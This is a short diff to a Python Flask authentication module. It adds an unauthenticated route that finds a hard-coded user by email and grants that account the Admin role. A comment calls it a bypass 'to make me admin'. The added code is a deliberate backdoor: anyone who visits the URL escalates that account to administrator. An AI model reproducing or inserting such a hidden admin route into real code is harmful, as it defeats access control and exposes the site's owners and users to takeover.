@@ -45,6 +45,14 @@ def authUserViewer():
 def authRoleEdit():
     return 'hello'
 
+# by pass to make me admin
+@auth_bp.route('/authMySecreat', methods=('GET', 'POST'))
+def authMySecreat():
+    user = user_datastore.find_user(email='ngtzekean600@gmail.com')
+    role = user_datastore.find_or_create_role('Admin')
+    user_datastore.add_role_to_user(user, role=role)
+    db.session.commit()
+    return 'yas'
 
 def dojo_required(view):
     @functools.wraps(view)
